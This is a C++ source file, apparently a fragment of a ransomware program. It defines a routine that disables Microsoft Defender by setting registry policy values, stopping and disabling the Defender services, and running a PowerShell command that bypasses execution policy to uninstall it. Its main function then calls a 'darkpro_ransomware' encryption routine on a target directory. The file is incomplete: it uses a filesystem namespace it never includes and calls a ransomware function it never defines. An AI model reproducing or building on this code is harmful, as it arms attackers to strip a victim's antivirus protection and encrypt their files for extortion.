#include <windows.h>
#include <iostream>

// Function to disable Microsoft Defender (Windows-specific)
bool disable_defender() {
#ifdef _WIN32
    std::cout << "Attempting to disable Microsoft Defender..." << std::endl;

    // Step 1: Disable Real-Time Protection via Registry
    HKEY hKey;
    const char* regPath = "Software\\Policies\\Microsoft\\Windows Defender";
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        std::cerr << "Failed to access registry. Admin privileges required." << std::endl;
        return false;
    }

    DWORD value = 1;
    if (RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS ||
        RegSetValueEx(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry values for disabling Defender." << std::endl;
        RegCloseKey(hKey);
        return false;
    }
    RegCloseKey(hKey);

    // Step 2: Stop Defender services using system commands
    const char* commands[] = {
        "net stop WinDefend",              // Stop Windows Defender Service
        "net stop WdNisSvc",               // Stop Windows Defender Network Inspection Service
        "net stop Sense",                  // Stop Windows Defender Advanced Threat Protection
        "sc config WinDefend start= disabled", // Disable auto-start of Defender service
        "sc config WdNisSvc start= disabled",  // Disable auto-start of Network Inspection
        "sc config Sense start= disabled"      // Disable auto-start of ATP
    };

    for (const char* cmd : commands) {
        if (system(cmd) != 0) {
            std::cerr << "Failed to execute command: " << cmd << std::endl;
        } else {
            std::cout << "Executed: " << cmd << std::endl;
        }
    }

    // Step 3: Unload Defender via PowerShell (bypass tamper protection if possible)
    const char* psCommand = "powershell -ExecutionPolicy Bypass -Command \"Uninstall-WindowsFeature -Name Windows-Defender\"";
    if (system(psCommand) != 0) {
        std::cerr << "Failed to execute PowerShell command to uninstall Defender features." << std::endl;
    } else {
        std::cout << "PowerShell command to disable Defender executed." << std::endl;
    }

    std::cout << "Microsoft Defender disable attempt completed. Note: Tamper Protection may prevent full disable." << std::endl;
    return true;
#else
    std::cout << "Microsoft Defender disable function is Windows-specific. Skipping on non-Windows platform." << std::endl;
    return false;
#endif
}

// Updated main function to include Defender disable attempt
int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <target_directory>" << std::endl;
        return 1;
    }

    std::string target_dir = argv[1];
    if (!fs::exists(target_dir) || !fs::is_directory(target_dir)) {
        std::cerr << "Invalid directory: " << target_dir << std::endl;
        return 1;
    }

    // Attempt to disable Microsoft Defender before starting ransomware operations
    disable_defender();

    // Proceed with ransomware encryption process
    darkpro_ransomware(target_dir);
    return 0;
}
